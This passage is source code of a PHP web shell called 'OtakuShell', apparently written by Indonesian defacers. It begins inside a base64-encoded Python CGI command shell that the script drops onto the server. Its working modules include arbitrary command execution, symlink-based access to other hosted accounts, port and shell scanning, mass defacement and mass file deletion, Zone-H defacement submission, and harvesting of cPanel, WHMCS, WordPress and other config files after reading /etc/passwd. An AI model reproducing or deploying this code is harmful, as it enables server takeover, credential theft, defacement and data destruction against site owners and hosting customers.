aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
   echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
 
 </div>"; 
}

elseif($_GET['do'] == 'symlink')
{	
?>
<form action="?do=symlink" method="post">

<?php   

@set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}

elseif($_GET['do'] == 'portscan')
    {
    ?>
    <form action="?do=portscan" method="post">
    <?php
    echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
    for($i = $start; $i<=$end; $i++){
    $fp = @fsockopen($host, $i, $errno, $errstr, 3);
    if($fp){
    echo 'Port '.$i.' is <font color=green>open</font><br>';
    }
    flush();
    }
    }else{
    echo '<table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
    }
}

 elseif($_GET['do'] == 'shelscan') {
    echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("tus.php","miko.php","idcx.php","zakir.php","WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl",
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/",
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","cox.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","k.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); //
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; //
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
}
elseif($_GET['do'] == 'tentang') {
    echo "<center><br><br><br><font color='cyan' size='7'>OtakuShell</font><font color='aquamarine' size='3'></font><font color='aquamarine'><br> by<br> PhobiaXploit
	<br><br>Nande Watashi Namain OtakuShell?<br>Soalnya Watashi Suka Nonton Anime :)(<br>Udah Gitu Doang<br>
Dan Gitu lah knapa Watashi Namain Ini OtakuShell :v<br>Watashi>>Gue<br><font color='cyan'>Shell Ini Di Recode Oleh ./Tsuki Dan Sedikit Bantuan Dari Dominic404
 <br><br><font color='red'>Thanks to:</font><br>IndoXploit ~ NostalgiaXploit ~ ScorpionDefacer ~ r00t666h0st ~ Tod Defacer Team ~ And You</font>";
	 echo "<br> Recoded From :<br><br>Indonesia Cyber Ex<br>IndoXploit-Poison<br>ZakirDotId <br>TerserahShell v2<br>ECT</center>";
}
elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><h2>Zone-H</h2></center><center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='PhobiaXploit'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
}elseif($_GET['do'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }
    echo "Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='upload' name='upload'>
    </form>";
    echo $act;
    echo "</center>";
} elseif($_GET['do'] == 'cmd') {
    echo "<form method='post'>
    <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
    <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
    </form>";
    if($_POST['do_cmd']) {
        echo "<pre>".exe($_POST['cmd'])."</pre>";
    }
} elseif($_GET['do'] == 'mass_deface') {
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        }
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
    <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Index File:</font><br>
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked By PhobiaXploit</textarea><br>
    <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
    </form></center>";
    }
} elseif($_GET['do'] == 'mass_delete') {
    function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    if(file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif($dirb === '..') {
                    if(file_exists("".dirname($dir)."/$namafile")) {
                        unlink("".dirname($dir)."/$namafile");
                    }
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
                                $idx = hapus_massal($dirc,$namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo "</div>";
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
    </form></center>";
    }
}
elseif($_GET['do'] == 'zip') {
    echo "<h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
    $filename = $_FILES["zip_file"]["name"];
    $source = $_FILES["zip_file"]["tmp_name"];
    $type = $_FILES["zip_file"]["type"];
    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
        if($mime_type == $type) {
            $okay = true;
            break;
        }
    }
    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
        $message = "Itu Bukan Zip  , , GOBLOK COK";
    }
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip');
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename;
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
    if(move_uploaded_file($source, $targetzip)) {
        $zip = new ZipArchive();
        $x = $zip->open($targetzip);
        if ($x === true) {
            $zip->extractTo($targetdir);
            $zip->close();

            unlink($targetzip);
        }
        $message = "<b>Sukses Gan :)</b>";
    } else {
        $message = "<b>Error Gan :(</b>";
    }
}
echo '<table style="width:100%" border="1">
  <tr><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</tr><hr><tr><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/zakir_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";
    if($_POST['backup']){
    $save=$_POST['save'];
    function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
    Zip($_POST['dir'],$save);
    echo "Done , Save To <b>$save</b>";
    }
    echo "</tr><hr><tr><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/Zak_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
    if($_POST['extrak']){
    $save=$_POST['save'];
    $zip = new ZipArchive;
    $res = $zip->open($_POST['dir']);
    if ($res === TRUE) {
        $zip->extractTo($save);
        $zip->close();
    echo 'Succes , Location : <b>'.$save.'</b>';
    } else {
    echo 'Gagal Mas :( Ntahlah !';
    }
    }
echo '</tr></table>';
} elseif($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("idx_config", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("idx_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }
            }
        }
    }
    echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
} elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
